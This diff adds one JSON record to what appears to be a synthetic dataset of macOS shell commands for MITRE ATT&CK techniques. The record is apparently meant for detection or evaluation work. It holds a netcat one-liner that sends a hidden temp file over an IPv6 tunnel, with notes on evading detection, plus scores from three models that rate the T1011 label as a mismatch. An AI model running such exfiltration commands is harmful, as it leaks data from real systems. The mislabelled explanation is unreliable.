@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
+  "explanation": "Uses IPv6 TCP bound to the 6to4/tunnel interface (stf0) targeting a link-local address on an uncommon port, meeting T1011 by selecting an alternate network medium for exfiltration.",
+  "rationale_steps": [
+    "Leverage ipconfig to read the stf0 IPv6 address for source binding.",
+    "Send data via TCP over the stf0 tunnel to avoid the primary network path.",
+    "Choose a high, uncommon destination port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-6cd37c09",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid nc flags (-6 and -s), correct command substitution, proper IPv6 address with zone index, and valid input redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "This performs network-based exfiltration over IPv6 rather than exfiltration over a physical medium, and also depends on the stf0 interface and link-local reachability which may not exist, so it does not align with T1011 as described.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T09:45:49.528630Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, and correct command structure for redirecting file content.",
+        "semantic_score": 2,
+        "semantic_justification": "The command uses netcat for network exfiltration over IPv6 which is misaligned with T1011 (Exfiltration Over Physical Medium) as it's using network transmission rather than physical media like USB drives or optical disks.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:45:52.393150Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quotes, correct command substitution for the source IP, and proper input redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs network exfiltration using IPv6, which fundamentally misaligns with MITRE ATT&CK T1011 'Exfiltration Over Physical Medium,' a technique explicitly describing the use of removable storage or other physical transport methods.",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T09:46:04.836762Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
